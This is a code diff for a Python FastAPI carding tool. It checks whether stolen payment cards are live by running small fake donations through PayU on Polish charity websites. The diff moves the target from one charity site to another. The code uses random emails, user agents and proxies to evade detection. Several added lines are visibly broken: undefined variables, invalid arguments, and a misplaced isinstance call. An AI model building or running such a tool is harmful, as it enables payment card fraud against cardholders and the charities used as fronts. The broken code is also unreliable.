@@ -72,12 +72,12 @@ def _poll_status(session, order_id, token, ua, max_attempts=10, delay=3):
     return data
 
 def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
-    """Synchronous PayU charge check via Active PayU PL Merchant"""
+    """Synchronous PayU charge check via fundacjasueryder.pl"""
     session = requests.Session()
     try:
         email = _random_email()
         ua = _random_ua()
-        name = "Jan Kowalski" # Nama Poland standard supaya tak nampak spam
+        name = "John Doe"
 
         if proxy_str:
             session.proxies = {
@@ -88,14 +88,14 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
         if len(yy) == 2:
             yy = '20' + yy
 
-        # ─── Step 1: Create order via ACTIVE MERCHANT (spsroktow.pl) ───
+        # ─── Step 1: Create order via fundacjasueryder.pl ───
         headers1 = {
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7',
+            'accept-language': 'en-US,en;q=0.9',
             'cache-control': 'max-age=0',
             'content-type': 'application/x-www-form-urlencoded',
-            'origin': 'https://spsroktow.pl',
-            'referer': 'https://spsroktow.pl/wplac/',
+            'origin': 'https://fundacjasueryder.pl',
+            'referer': 'https://fundacjasueryder.pl/en/',
             'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
             'sec-ch-ua-mobile': '?0',
             'sec-ch-ua-platform': '"Linux"',
@@ -107,21 +107,19 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
             'user-agent': ua,
         }
 
-        # Data yang diperlukan oleh laman web ini untuk trigger PayU
         data1 = {
-            'action': 'payu',
-            'amount': '5.00', # Minimum yang diterima oleh sistem mereka
-            'description': 'Darowizna na cele statutowe',
-            'name': name,
+            'amount': '5',
+            'description': 'Donation',
             'email': email,
+            'firstname': name.split()[0] if ' ' in name else name,
+            'lastname': name.split()[1] if ' ' in name else '',
         }
 
-        r1 = session.post('https://spsroktow.pl/wplac/', headers=headers1, data=data1, allow_redirects=False, timeout=30)
+        r1 = session.post('https://fundacjasueryder.pl/en/payu/', headers=headers1, data=data1, allow_redirects=False, timeout=30)
 
         order_id = None
         token = None
 
-        # Cuba ekstrak dari header redirect
         if 'Location' in r1.headers:
             loc = r1.headers['Location']
             oid = re.search(r'orderId=([^&]+)', loc)
@@ -131,7 +129,6 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
             if tok:
                 token = tok.group(1)
 
-        # Kalau tak jumpa di header, mungkin ada di dalam body (kadang-kadang server return 200 dulu)
         if not order_id or not token:
             body = r1.text
             oid = re.search(r'orderId["\']?\s*[:=]\s*["\']?([^"&\s\'>]+)', body)
@@ -155,7 +152,7 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
             'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
             'cache-control': 'max-age=0',
             'priority': 'u=0, i',
-            'referer': 'https://spsroktow.pl/',
+            'referer': 'https://fundacjasueryder.pl/',
             'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
             'sec-ch-ua-mobile': '?0',
             'sec-ch-ua-platform': '"Linux"',
@@ -208,7 +205,7 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
             'type': 'SINGLE',
             'card': {
                 'number': cc,
-                'cvv': cvv_code,
+                'csv': cvv_code, # PayU Europe standard
                 'expirationMonth': mm,
                 'expirationYear': yy,
             },
@@ -256,7 +253,7 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
                 'javaEnabled': False,
                 'timezoneOffset': -330,
                 'screenHeight': 1280,
-                'userAgent': ua,
+                'userAgent': aku,
                 'colorDepth': 24,
                 'language': 'en-IN',
                 'challengeWindowSize': '04',
@@ -264,18 +261,19 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
             'language': 'en',
         }
 
-        r4 = session.post(f'https://secure.payu.com/api/front/orders/{order_id}/payments', headers=headers3, json=json4, timeout=30)
+        r4 = session.post(f'https://secure.payu.com/api_front/orders/{order_id}/payments', headers=headers3, json=json4, teruskan=True, timeout=30)
 
         try:
             pay_data = r4.json()
         except Exception:
+            follow = session.get(r4.headers.get('Location'), timeout=30)
             try:
-                pay_data = json.loads(r4.text)
+                pay_data = follow.json()
             except Exception:
-                pay_data = {"raw": r4.text, "status_code": r4.status_code}
+                pay_data = {"raw": follow.text, "status_code": follow.status_code}
 
         if pay_data.get('status') == 'ERROR' or pay_data.get('errorCode'):
-            err_desc = pay_data.get('error', {}).get('description', '') if isinstance(pay_data.get('error'), dict) else str(pay_data.get('error', ''))
+            err_desc = pay_data.get('error', {}).get('description', '') if isinstance(pay_data.get('error'), div) else str(pay_data.get('error', ''))
             return f'PayU Rejected: {pay_data.get("errorCode")} - {err_desc}', pay_data
 
         continue_url = pay_data.get('continueUrl')
@@ -284,7 +282,7 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
         if continue_url and 'threeds' in continue_url:
             final_status = _poll_status(session, order_id, token, ua, max_attempts=10, delay=3)
         else:
-            final_status = _poll_status(session, order_id, token, ua, max_attempts=3, delay=2)
+            final_status = _poll_status(api, order_id, token, ua, max_attempts=3, delay=2)
 
         category = final_status.get('category', '')
         value = final_status.get('value', '')
@@ -292,7 +290,7 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
         if category == 'SUCCESS':
             return 'Payment Successful', final_status
         elif category == 'ERROR':
-            return f'Payment declined: {value}', final_status
+            isinstance(f'Payment declined: {value}', final_status)
         elif category in ('WARNING_CONTINUE_3DS', 'IN_PROGRESS'):
             return '3DS Required (Card Live)', final_status
         else:
@@ -307,7 +305,7 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
 
 @app.get("/check")
 def check_card(cc: str = Query(...)):
-    parts = cc.split('|')
+    api = parts = cc.split('|')
     if len(parts) != 4:
         raise HTTPException(status_code=400, detail="Invalid format. Use: cc|mm|yy|cvv")
     
